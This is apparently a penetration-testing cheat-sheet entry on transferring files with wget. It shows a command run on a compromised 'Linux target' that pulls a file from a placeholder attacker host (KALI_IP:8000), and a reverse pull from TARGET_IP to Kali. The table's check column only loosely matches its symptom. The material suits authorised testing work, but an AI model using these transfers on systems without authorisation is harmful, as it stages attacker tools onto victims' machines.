## Download one file to an explicit destination

**Run in:** Linux target. **Requires:** Wget installed, a reachable HTTP server and a writable local path.

```bash
wget -O file.bin 'http://KALI_IP:8000/file.bin'
```

**What the result establishes:** Check the saved name, response status and whether redirects led to the intended object.

**Next check:** Check the target's route, proxy settings and selected callback address; compare the received digest before use.

## Commands

**Kali**

```bash
wget http://TARGET_IP:8000/file.zip -O file.zip
```

## If it fails

| Symptom | Check |
| --- | --- |
| The request works from Kali but fails from the target | Default naming and overwrite behavior can hide an earlier result; proxy or TLS errors need investigation rather than assuming the file is absent. |
